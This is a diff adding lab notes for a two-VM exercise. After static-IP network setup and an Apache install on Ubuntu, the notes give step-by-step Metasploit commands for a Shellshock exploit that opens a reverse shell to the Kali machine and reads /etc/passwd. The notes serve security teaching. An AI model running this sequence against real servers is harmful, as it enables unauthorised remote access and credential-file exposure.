@@ -1,0 +1,59 @@
+Commands:
+1.	ip a (both) (in eth0 and ensp0s3 3rd line in inet note down ipv4 of both)
+2.	Configure Statis ip:
+ubuntu: 
+a.	su – 
+b.	sudo nano /etc/netplan/01-network-manager.yaml
+ network:
+  version: 2
+  renderer: NetworkManager
+  ethernets:
+    enp0s3:
+      addresses: [10.0.2.50/24]
+      routes:
+        - to: default
+          via: 10.0.2.2
+      nameservers:
+        addresses: [8.8.8.8, 8.8.4.4]
+ctrl+O, enter, ctrl+X
+c.	sudo netplan apply
+kali:
+a.	sudo nano /etc/network/interfaces
+auto eth0
+iface eth0 inet static
+  address 10.0.2.51
+  netmask 255.255.255.0
+gateway 10.0.2.2
+ctrl+O, enter, ctrl+X
+b.	sudo systemctl restart networking
+
+3.	in kali: ping 10.0.2.50
+in ubuntu : ping 10.0.2.51
+
+4.	In ubuntu:
+a.	sudo apt update
+b.	sudo apt install apache2
+c.	sudo systemctl enable apache2
+d.	sudo systemctl start apache2
+e.	sudo systemctl status apache2
+From Kali: Visit on browser ubuntu ip http://10.0.2.50
+5.	In Kali:
+a.	nmap 10.0.2.50
+b.	sudo apt update
+c.	sudo apt install metasploit-framework
+d.	sudo msfconsole
+e.	search apache_mod_cgi
+f.	use exploit/multi/http/apache_mod_cgi_bash_env_exec
+g.	set RHOSTS 10.0.2.50
+h.	set RPORT 80
+i.	set TARGETURI /cgi-bin/
+j.	set PAYLOAD linux/x86/shell_reverse_tcp
+k.	set LHOST 10.0.2.51
+l.	set LPORT 4444
+m.	run
+n.	exploit
+o.	ls
+p.	cat /etc/passwd
+q.	ls -R
+
+6.	In Ubuntu: to stop apache : sudo systemctl stop apache2
